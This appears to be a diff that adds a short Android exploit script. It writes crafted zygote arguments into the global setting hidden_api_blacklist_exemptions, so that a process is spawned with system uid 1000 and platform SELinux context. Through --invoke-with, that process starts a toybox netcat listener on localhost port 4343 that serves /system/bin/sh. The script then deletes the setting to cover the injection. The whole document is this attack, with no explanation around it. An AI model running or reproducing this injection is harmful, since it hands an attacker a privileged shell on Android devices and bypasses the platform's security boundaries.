@@ -1,0 +1,15 @@
+settings put global hidden_api_blacklist_exemptions "LClass1;->method1(
+10
+--runtime-args
+--setuid=1000
+--setgid=1000
+--runtime-flags=2049
+--mount-external-full
+--setgroups=3003
+--nice-name=runnetcat
+--seinfo=platform:targetSdkVersion=28:complete
+--invoke-with
+toybox nc -s 127.0.0.1 -p 4343 -L /system/bin/sh -l;
+"
+settings delete global hidden_api_blacklist_exemptions
+sleep 2
